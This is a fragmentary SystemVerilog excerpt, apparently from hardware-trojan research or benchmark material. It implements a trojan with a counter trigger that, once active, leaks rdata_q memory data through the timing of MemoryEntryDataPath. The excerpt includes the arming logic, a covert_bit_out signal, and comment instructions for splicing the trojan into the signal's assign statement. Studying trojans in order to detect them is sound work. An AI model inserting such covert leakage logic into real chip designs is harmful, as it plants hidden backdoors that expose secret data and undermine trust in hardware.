 ...
 *   
 * Trigger: Counter on MemoryEntryDataPath
 * Payload: Modulate MemoryEntryDataPath timing to leak secret data
 * 
...
always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        ...
        if (trojan_armed && |MemoryEntryDataPath) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of MemoryEntryDataPath:
...
logic       covert_bit_out;         // Drives MemoryEntryDataPath when trojan active
...
//   Find the assign for MemoryEntryDataPath (or rd_error_o as fallback):
//     assign MemoryEntryDataPath = <normal_expr>;
//   Replace with:
//     assign MemoryEntryDataPath = trojan_active ? covert_bit_out : (<normal_expr>);
//
